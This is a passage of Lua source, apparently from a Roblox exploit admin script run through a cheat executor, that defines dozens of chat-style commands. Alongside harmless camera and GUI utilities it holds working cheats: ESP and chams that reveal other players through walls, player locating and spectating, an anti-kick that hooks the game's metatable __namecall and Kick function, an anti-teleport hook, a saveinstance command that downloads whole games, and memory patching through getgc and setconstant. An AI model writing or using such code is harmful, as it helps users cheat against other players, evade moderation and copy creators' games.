			local view = Instance.new("BoxHandleAdornment")
			view.Adornee = pWayPoints[i].COORD[1]
			view.AlwaysOnTop = true
			view.ZIndex = 10
			view.Size = pWayPoints[i].COORD[1].Size
			view.Parent = pWayPoints[i].COORD[1]
			table.insert(waypointParts,view)
		end
	end)

	addcmd('hidewaypoints',{'hidewp','hidewps'},function(args, speaker)
		for i,v in pairs(waypointParts) do
			v:Destroy()
		end
		waypointParts = {}
	end)

	addcmd('waypoint',{'wp','lpos','loadposition','loadpos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					local x = WayPoints[i].COORD[1]
					local y = WayPoints[i].COORD[2]
					local z = WayPoints[i].COORD[3]
					getRoot(speaker.Character).CFrame = CFrame.new(x,y,z)
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					getRoot(speaker.Character).CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)
				end
			end
		end
	end)

	tweenSpeed = 1
	addcmd('tweenspeed',{'tspeed'},function(args, speaker)
		local newSpeed = args[1] or 1
		if tonumber(newSpeed) then
			tweenSpeed = tonumber(newSpeed)
		end
	end)

	addcmd('tweenwaypoint',{'twp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(x,y,z)}):Play()
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)}):Play()
				end
			end
		end
	end)

	addcmd('walktowaypoint',{'wtwp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(x,y,z)
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(pWayPoints[i].COORD[1].Position)
				end
			end
		end
	end)

	addcmd('deletewaypoint',{'dwp','dpos','deleteposition','deletepos'},function(args, speaker)
		for i,v in pairs(WayPoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
				table.remove(WayPoints, i)
			end
		end
		if AllWaypoints ~= nil and #AllWaypoints > 0 then
			for i,v in pairs(AllWaypoints) do
				if v.NAME:lower() == tostring(getstring(1)):lower() then
					if not v.GAME or v.GAME == game.PlaceId then
						table.remove(AllWaypoints, i)
					end
				end
			end
		end
		for i,v in pairs(pWayPoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
				table.remove(pWayPoints, i)
			end
		end
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('clearwaypoints',{'cwp','clearpositions','cpos','clearpos'},function(args, speaker)
		WayPoints = {}
		pWayPoints = {}
		refreshwaypoints()
		updatesaves()
		AllWaypoints = {}
		notify('Modified Waypoints','Removed all waypoints')
	end)

	addcmd('enable',{},function(args, speaker)
		if args[1]:lower() == 'inventory' or args[1]:lower() == 'backpack' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', true)
		elseif args[1]:lower() == 'playerlist' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', true)
		elseif args[1]:lower() == 'chat' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', true)
		elseif args[1]:lower() == 'all' then
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
		end
	end)

	addcmd('disable',{},function(args, speaker)
		if args[1]:lower() == 'inventory' or args[1]:lower() == 'backpack' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', false)
		elseif args[1]:lower() == 'playerlist' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', false)
		elseif args[1]:lower() == 'chat' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', false)
		elseif args[1]:lower() == 'all' then
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
		end
	end)

	local invisGUIS = {}
	addcmd('showguis',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
			if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
				v.Visible = true
				if not FindInTable(invisGUIS,v) then
					table.insert(invisGUIS,v)
				end
			end
		end
	end)

	addcmd('unshowguis',{},function(args, speaker)
		for i,v in pairs(invisGUIS) do
			v.Visible = false
		end
		invisGUIS = {}
	end)

	local hiddenGUIS = {}
	addcmd('hideguis',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
			if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
				v.Visible = false
				if not FindInTable(hiddenGUIS,v) then
					table.insert(hiddenGUIS,v)
				end
			end
		end
	end)

	addcmd('unhideguis',{},function(args, speaker)
		for i,v in pairs(hiddenGUIS) do
			v.Visible = true
		end
		hiddenGUIS = {}
	end)

	function deleteGuisAtPos()
		pcall(function()
			local guisAtPosition = game.Players.LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
			for _, gui in pairs(guisAtPosition) do
				if gui.Visible == true then
					gui:Destroy()
				end
			end
		end)
	end

	local deleteGuiInput
	addcmd('guidelete',{},function(args, speaker)
		deleteGuiInput = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
				if input.KeyCode == Enum.KeyCode.Backspace then
					deleteGuisAtPos()
				end
			end
		end)
		notify('GUI Delete Enabled','Hover over a GUI and press backspace to delete it')
	end)

	addcmd('unguidelete',{'noguidelete'},function(args, speaker)
		if deleteGuiInput then deleteGuiInput:Disconnect() end
		notify('GUI Delete Disabled','GUI backspace delete has been disabled')
	end)

	local wasStayOpen = StayOpen
	addcmd('hideiy',{},function(args, speaker)
		wasStayOpen = StayOpen
		if StayOpen == true then StayOpen = false
			On.BackgroundTransparency = 1
		end
		minimizeNum = 0
		minimizeHolder()
		notify('IY Hidden','You can press the prefix key to access the command bar')
	end)

	addcmd('showiy',{},function(args, speaker)
		minimizeNum = -20
		if wasStayOpen then
			maximizeHolder()
			StayOpen = true
			On.BackgroundTransparency = 0
		else
			minimizeHolder()
		end
	end)

	addcmd('rec', {'record'}, function(args, speaker)
		return game:GetService("CoreGui"):ToggleRecording()
	end)

	addcmd('screenshot', {'scrnshot'}, function(args, speaker)
		return game:GetService("CoreGui"):TakeScreenshot()
	end)

	addcmd('togglefs', {'togglefullscreen'}, function(args, speaker)
		return game:GetService("GuiService"):ToggleFullscreen()
	end)

	addcmd('inspect', {'examine'}, function(args, speaker)
		local GuiService = game:GetService("GuiService")
		for _, v in ipairs(getPlayer(args[1], speaker)) do
			GuiService:CloseInspectMenu()
			GuiService:InspectPlayerFromUserId(Players[v].UserId)
		end
	end)

	addcmd('savegame',{'saveplace'},function(args, speaker)
		if saveinstance then
			notify("Loading","Downloading game. This will take a while")
			if getsynasset then
				saveinstance()
			else
				saveinstance(game)
			end
			notify('Game Saved','Saved place to the workspace folder within your exploit folder.')
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing saveinstance)')
		end
	end)


	addcmd('clearerror',{'clearerrors'},function(args, speaker)
		game:GetService("GuiService"):ClearError()
	end)

	addcmd('clientantikick',{'antikick'},function(args, speaker)
		local mt = getrawmetatable(game)
		local old = mt.__namecall
		local protect = newcclosure or protect_function

		if not protect then
			notify("Incompatible Exploit Warning", "Your exploit does not support protection against stack trace errors, resulting to fallback function")
			protect = function(f) return f end
		end

		setreadonly(mt, false)
		mt.__namecall = protect(function(self, ...)
			local method = getnamecallmethod()
			if method == "Kick" then
				wait(9e9)
				return
			end
			return old(self, ...)
		end)
		hookfunction(Players.LocalPlayer.Kick,protect(function() wait(9e9) end))

		notify('Client Antikick','Client anti kick is now active (only effective on localscript kick)')
	end)

	allow_rj = true
	addcmd('clientantiteleport',{'antiteleport'},function(args, speaker)
		local TeleportService, tp, tptpi = game:GetService("TeleportService")
		tp = hookfunction(TeleportService.Teleport, function(id, ...)
			if allow_rj and id == game.Placeid then
				return tp(id, ...)
			end
			return wait(9e9)
		end)
		tptpi = hookfunction(TeleportService.TeleportToPlaceInstance, function(id, server, ...)
			if allow_rj and id == game.Placeid and server == game.JobId then
				return tp(id, server, ...)
			end
			return wait(9e9)
		end)

		notify('Client AntiTP','Client anti teleport is now active (only effective on localscript teleport)')
	end)

	addcmd('allowrejoin',{'allowrj'},function(args, speaker)
		if args[1] and args[1] == 'false' then
			allow_rj = false
			notify('Client AntiTP','Allow rejoin set to false')
		else
			allow_rj = true
			notify('Client AntiTP','Allow rejoin set to true')
		end
	end)

	addcmd('cancelteleport',{'canceltp'},function(args, speaker)
		game:GetService("TeleportService"):TeleportCancel()
	end)

	addcmd('volume',{'vol'},function(args, speaker)
		local level = args[1]/10
		UserSettings():GetService("UserGameSettings").MasterVolume = level
	end)

	addcmd('antilag',{'boostfps','lowgraphics'},function(args, speaker)
		workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0
		workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0
		workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0
		workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").FogEnd = 9e9
		settings().Rendering.QualityLevel = 1
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
				v.Material = "Plastic"
				v.Reflectance = 0
			elseif v:IsA("Decal") then
				v.Transparency = 1
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Lifetime = NumberRange.new(0)
			elseif v:IsA("Explosion") then
				v.BlastPressure = 1
				v.BlastRadius = 1
			end
		end
		for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
			if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
				v.Enabled = false
			end
		end
	end)

	addcmd('setfpscap', {'fpscap', 'maxfps'}, function(args, speaker)
		if setfpscap and type(setfpscap) == "function" then
			local num = args[1] or 1e6
			if num == 'none' then
				return setfpscap(1e6)
			elseif num > 0 then
				return setfpscap(num)
			else
				return notify('Invalid argument', "Please provide a number above 0 or 'none'.")
			end
		else
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setfpscap)')
		end
	end)

	addcmd('notify',{},function(args, speaker)
		notify(getstring(1))
	end)

	addcmd('lastcommand',{'lastcmd'},function(args, speaker)
		if cmdHistory[1]:sub(1,11) ~= 'lastcommand' and cmdHistory[1]:sub(1,7) ~= 'lastcmd' then
			execCmd(cmdHistory[1])
		end
	end)

	addcmd('esp',{},function(args, speaker)
		if not CHMSenabled then
			ESPenabled = true
			for i,v in pairs(Players:GetChildren()) do
				if v.ClassName == "Player" and v.Name ~= speaker.Name then
					ESP(v)
				end
			end
		else
			notify('ESP','Disable chams (nochams) before using esp')
		end
	end)

	addcmd('noesp',{'unesp'},function(args, speaker)
		ESPenabled = false
		for i,c in pairs(COREGUI:GetChildren()) do
			if string.sub(c.Name, -4) == '_ESP' then
				c:Destroy()
			end
		end
	end)

	local espParts = {}
	local partEspTrigger = nil
	function partAdded(part)
		if #espParts > 0 then
			if FindInTable(espParts,part.Name:lower()) then
				local a = Instance.new("BoxHandleAdornment")
				a.Name = part.Name:lower().."_PESP"
				a.Parent = part
				a.Adornee = part
				a.AlwaysOnTop = true
				a.ZIndex = 0
				a.Size = part.Size
				a.Transparency = 0.3
				a.Color = BrickColor.new("Lime green")
			end
		else
			partEspTrigger:Disconnect()
			partEspTrigger = nil
		end
	end

	addcmd('partesp',{},function(args, speaker)
		local partEspName = getstring(1):lower()
		if not FindInTable(espParts,partEspName) then
			table.insert(espParts,partEspName)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Name:lower() == partEspName then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = partEspName.."_PESP"
					a.Parent = v
					a.Adornee = v
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = v.Size
					a.Transparency = 0.3
					a.Color = BrickColor.new("Lime green")
				end
			end
		end
		if partEspTrigger == nil then
			partEspTrigger = workspace.DescendantAdded:Connect(partAdded)
		end
	end)

	addcmd('unpartesp',{'nopartesp'},function(args, speaker)
		if args[1] then
			local partEspName = getstring(1):lower()
			if FindInTable(espParts,partEspName) then
				table.remove(espParts, GetInTable(espParts, partEspName))
			end
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BoxHandleAdornment") and v.Name == partEspName..'_PESP' then
					v:Destroy()
				end
			end
		else
			partEspTrigger:Disconnect()
			partEspTrigger = nil
			espParts = {}
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BoxHandleAdornment") and v.Name:sub(-5) == '_PESP' then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('chams',{},function(args, speaker)
		if not ESPenabled then
			CHMSenabled = true
			for i,v in pairs(Players:GetChildren()) do
				if v.ClassName == "Player" and v.Name ~= speaker.Name then
					CHMS(v)
				end
			end
		else
			notify('Chams','Disable ESP (noesp) before using chams')
		end
	end)

	addcmd('nochams',{'unchams'},function(args, speaker)
		CHMSenabled = false
		for i,v in pairs(Players:GetChildren()) do
			local chmsplr = v
			for i,c in pairs(COREGUI:GetChildren()) do
				if c.Name == chmsplr.Name..'_CHMS' then
					c:Destroy()
				end
			end
		end
	end)

	addcmd('locate',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			Locate(Players[v])
		end
	end)

	addcmd('nolocate',{'unlocate'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if args[1] then
			for i,v in pairs(players) do
				for i,c in pairs(COREGUI:GetChildren()) do
					if c.Name == Players[v].Name..'_LC' then
						c:Destroy()
					end
				end
			end
		else
			for i,c in pairs(COREGUI:GetChildren()) do
				if string.sub(c.Name, -3) == '_LC' then
					c:Destroy()
				end
			end
		end
	end)

	viewing = nil
	addcmd('view',{'spectate'},function(args, speaker)
		StopFreecam()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			viewing = Players[v]
			workspace.CurrentCamera.CameraSubject = viewing.Character
			notify('Spectate','Viewing ' .. Players[v].Name)
			local function viewDiedFunc()
				repeat wait() until Players[v].Character ~= nil and getRoot(Players[v].Character)
				workspace.CurrentCamera.CameraSubject = viewing.Character
			end
			viewDied = Players[v].CharacterAdded:Connect(viewDiedFunc)
			local function viewChangedFunc()
				workspace.CurrentCamera.CameraSubject = viewing.Character
			end
			viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
		end
	end)

	addcmd('viewpart',{'viewp'},function(args, speaker)
		StopFreecam()
		if args[1] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
					wait(0.1)
					workspace.CurrentCamera.CameraSubject = v
				end
			end
		end
	end)

	addcmd('unview',{'unspectate'},function(args, speaker)
		StopFreecam()
		if viewing ~= nil then
			viewing = nil
			notify('Spectate','View turned off')
		end
		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end
		workspace.CurrentCamera.CameraSubject = speaker.Character
	end)


	fcRunning = false
	local Camera = workspace.CurrentCamera
	workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local newCamera = workspace.CurrentCamera
		if newCamera then
			Camera = newCamera
		end
	end)

	local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value

	Spring = {} do
		Spring.__index = Spring

		function Spring.new(freq, pos)
			local self = setmetatable({}, Spring)
			self.f = freq
			self.p = pos
			self.v = pos*0
			return self
		end

		function Spring:Update(dt, goal)
			local f = self.f*2*math.pi
			local p0 = self.p
			local v0 = self.v

			local offset = goal - p0
			local decay = math.exp(-f*dt)

			local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
			local v1 = (f*dt*(offset*f - v0) + v0)*decay

			self.p = p1
			self.v = v1

			return p1
		end

		function Spring:Reset(pos)
			self.p = pos
			self.v = pos*0
		end
	end

	local cameraPos = Vector3.new()
	local cameraRot = Vector2.new()

	local velSpring = Spring.new(5, Vector3.new())
	local panSpring = Spring.new(5, Vector2.new())

	Input = {} do

		keyboard = {
			W = 0,
			A = 0,
			S = 0,
			D = 0,
			E = 0,
			Q = 0,
			Up = 0,
			Down = 0,
			LeftShift = 0,
		}

		mouse = {
			Delta = Vector2.new(),
		}

		NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
		PAN_MOUSE_SPEED = Vector2.new(1, 1)*(math.pi/64)
		NAV_ADJ_SPEED = 0.75
		NAV_SHIFT_MUL = 0.25

		navSpeed = 1

		function Input.Vel(dt)
			navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

			local kKeyboard = Vector3.new(
				keyboard.D - keyboard.A,
				keyboard.E - keyboard.Q,
				keyboard.S - keyboard.W
			)*NAV_KEYBOARD_SPEED

			local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)

			return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
		end

		function Input.Pan(dt)
			local kMouse = mouse.Delta*PAN_MOUSE_SPEED
			mouse.Delta = Vector2.new()
			return kMouse
		end

		do
			function Keypress(action, state, input)
				keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end

			function MousePan(action, state, input)
				local delta = input.Delta
				mouse.Delta = Vector2.new(-delta.y, -delta.x)
				return Enum.ContextActionResult.Sink
			end

			function Zero(t)
				for k, v in pairs(t) do
					t[k] = v*0
				end
			end

			function Input.StartCapture()
				game:GetService("ContextActionService"):BindActionAtPriority("FreecamKeyboard",Keypress,false,INPUT_PRIORITY,
				Enum.KeyCode.W,
				Enum.KeyCode.A,
				Enum.KeyCode.S,
				Enum.KeyCode.D,
				Enum.KeyCode.E,
				Enum.KeyCode.Q,
				Enum.KeyCode.Up,
				Enum.KeyCode.Down
				)
				game:GetService("ContextActionService"):BindActionAtPriority("FreecamMousePan",MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
			end

			function Input.StopCapture()
				navSpeed = 1
				Zero(keyboard)
				Zero(mouse)
				game:GetService("ContextActionService"):UnbindAction("FreecamKeyboard")
				game:GetService("ContextActionService"):UnbindAction("FreecamMousePan")
			end
		end
	end

	function GetFocusDistance(cameraFrame)
		local znear = 0.1
		local viewport = Camera.ViewportSize
		local projy = 2*math.tan(cameraFov/2)
		local projx = viewport.x/viewport.y*projy
		local fx = cameraFrame.rightVector
		local fy = cameraFrame.upVector
		local fz = cameraFrame.lookVector

		local minVect = Vector3.new()
		local minDist = 512

		for x = 0, 1, 0.5 do
			for y = 0, 1, 0.5 do
				local cx = (x - 0.5)*projx
				local cy = (y - 0.5)*projy
				local offset = fx*cx - fy*cy + fz
				local origin = cameraFrame.p + offset*znear
				local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
				local dist = (hit - origin).magnitude
				if minDist > dist then
					minDist = dist
					minVect = offset.unit
				end
			end
		end

		return fz:Dot(minVect)*minDist
	end

	local function StepFreecam(dt)
		local vel = velSpring:Update(dt, Input.Vel(dt))
		local pan = panSpring:Update(dt, Input.Pan(dt))

		local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))

		cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
		cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))

		local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
		cameraPos = cameraCFrame.p

		Camera.CFrame = cameraCFrame
		Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
		Camera.FieldOfView = cameraFov
	end

	local PlayerState = {} do
		mouseBehavior = ""
		mouseIconEnabled = ""
		cameraType = ""
		cameraFocus = ""
		cameraCFrame = ""
		cameraFieldOfView = ""

		function PlayerState.Push()
			cameraFieldOfView = Camera.FieldOfView
			Camera.FieldOfView = 70

			cameraType = Camera.CameraType
			Camera.CameraType = Enum.CameraType.Custom

			cameraCFrame = Camera.CFrame
			cameraFocus = Camera.Focus

			mouseIconEnabled = UserInputService.MouseIconEnabled
			UserInputService.MouseIconEnabled = true

			mouseBehavior = UserInputService.MouseBehavior
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end

		function PlayerState.Pop()
			Camera.FieldOfView = 70

			Camera.CameraType = cameraType
			cameraType = nil

			Camera.CFrame = cameraCFrame
			cameraCFrame = nil

			Camera.Focus = cameraFocus
			cameraFocus = nil

			UserInputService.MouseIconEnabled = mouseIconEnabled
			mouseIconEnabled = nil

			UserInputService.MouseBehavior = mouseBehavior
			mouseBehavior = nil
		end
	end

	function StartFreecam(pos)
		if fcRunning then
			StopFreecam()
		end
		local cameraCFrame = Camera.CFrame
		if pos then
			cameraCFrame = pos
		end
		cameraRot = Vector2.new()
		cameraPos = cameraCFrame.p
		cameraFov = Camera.FieldOfView

		velSpring:Reset(Vector3.new())
		panSpring:Reset(Vector2.new())

		PlayerState.Push()
		game:GetService("RunService"):BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
		Input.StartCapture()
		fcRunning = true
	end

	function StopFreecam()
		if not fcRunning then return end
		Input.StopCapture()
		game:GetService("RunService"):UnbindFromRenderStep("Freecam")
		PlayerState.Pop()
		workspace.Camera.FieldOfView = 70
		fcRunning = false
	end

	addcmd('freecam',{'fc'},function(args, speaker)
		StartFreecam()
	end)

	addcmd('freecampos',{'fcpos','fcp','freecamposition','fcposition'},function(args, speaker)
		if not args[1] then return end
		local freecamPos = CFrame.new(args[1],args[2],args[3])
		StartFreecam(freecamPos)
	end)

	addcmd('freecamwaypoint',{'fcwp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					StartFreecam(CFrame.new(x,y,z))
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					StartFreecam(CFrame.new(pWayPoints[i].COORD[1].Position))
				end
			end
		end
	end)

	addcmd('freecamgoto',{'fcgoto','freecamtp','fctp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			StartFreecam(getRoot(Players[v].Character).CFrame)
		end
	end)

	addcmd('unfreecam',{'nofreecam','unfc','nofc'},function(args, speaker)
		StopFreecam()
	end)

	addcmd('freecamspeed',{'fcspeed'},function(args, speaker)
		local FCspeed = args[1] or 1
		if isNumber(FCspeed) then
			NAV_KEYBOARD_SPEED = Vector3.new(FCspeed, FCspeed, FCspeed)
		end
	end)

	addcmd('gotocamera',{'gotocam','tocam'},function(args, speaker)
		getRoot(speaker.Character).CFrame = workspace.Camera.CFrame
	end)

	addcmd('tweengotocamera',{'tweengotocam','tgotocam','ttocam'},function(args, speaker)
		game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = workspace.Camera.CFrame}):Play()
	end)

	addcmd('fov',{},function(args, speaker)
		local fov = args[1] or 70
		if isNumber(fov) then
			workspace.CurrentCamera.FieldOfView = fov
		end
	end)

	local preMaxZoom = Players.LocalPlayer.CameraMaxZoomDistance
	local preMinZoom = Players.LocalPlayer.CameraMinZoomDistance
	addcmd('lookat',{},function(args, speaker)
		if speaker.CameraMaxZoomDistance ~= 0.5 then
			preMaxZoom = speaker.CameraMaxZoomDistance
			preMinZoom = speaker.CameraMinZoomDistance
		end
		speaker.CameraMaxZoomDistance = 0.5
		speaker.CameraMinZoomDistance = 0.5
		wait()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local target = Players[v].Character
			if target and target:FindFirstChild('Head') then
				workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, target.Head.CFrame.p)
				wait(0.1)
			end
		end
		speaker.CameraMaxZoomDistance = preMaxZoom
		speaker.CameraMinZoomDistance = preMinZoom
	end)

	addcmd('fixcam',{'restorecam'},function(args, speaker)
		StopFreecam()
		execCmd('unview')
		workspace.CurrentCamera:remove()
		wait(.1)
		repeat wait() until speaker.Character ~= nil
		workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
		workspace.CurrentCamera.CameraType = "Custom"
		speaker.CameraMinZoomDistance = 0.5
		speaker.CameraMaxZoomDistance = 400
		speaker.CameraMode = "Classic"
		speaker.Character.Head.Anchored = false
	end)

	addcmd('enableshiftlock',{'enablesl','shiftlock'},function(args, speaker)
		speaker.DevEnableMouseLock = true
		notify('Shiftlock','Shift lock is now available')
	end)

	addcmd('firstp',{},function(args, speaker)
		speaker.CameraMode = "LockFirstPerson"
	end)

	addcmd('thirdp',{},function(args, speaker)
		speaker.CameraMode = "Classic"
	end)

	addcmd('noclipcam', {'nccam'}, function(args, speaker)
		local sc = (debug and debug.setconstant) or setconstant
		local gc = (debug and debug.getconstants) or getconstants
		if not sc or not getgc or not gc then
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)')
		end
		local pop = speaker.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
		for _, v in pairs(getgc()) do
			if type(v) == 'function' and getfenv(v).script == pop then
				for i, v1 in pairs(gc(v)) do
					if tonumber(v1) == .25 then
						sc(v, i, 0)
					elseif tonumber(v1) == 0 then
						sc(v, i, .25)
					end
				end
			end
		end
	end)


	addcmd('maxzoom',{},function(args, speaker)
		speaker.CameraMaxZoomDistance = args[1]
	end)

	addcmd('minzoom',{},function(args, speaker)
		speaker.CameraMinZoomDistance = args[1]
	end)

	addcmd('unlockws',{'unlockworkspace'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Locked = false
			end
		end
	end)

	addcmd('lockws',{'lockworkspace'},function(args, speaker) 
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Locked = true
			end
		end
	end)

	addcmd('delete',{'remove'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted ' ..getstring(1))
	end)

	addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
	end)

	addcmd('chardelete',{'charremove','cd'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted ' ..getstring(1))
	end)

	addcmd('chardeleteclass',{'charremoveclass','chardeleteclassname','charremoveclassname','cdc'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
	end)

	addcmd('deletevelocity',{'dv','removevelocity','removeforces'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
				v:Destroy()
			end
		end
	end)

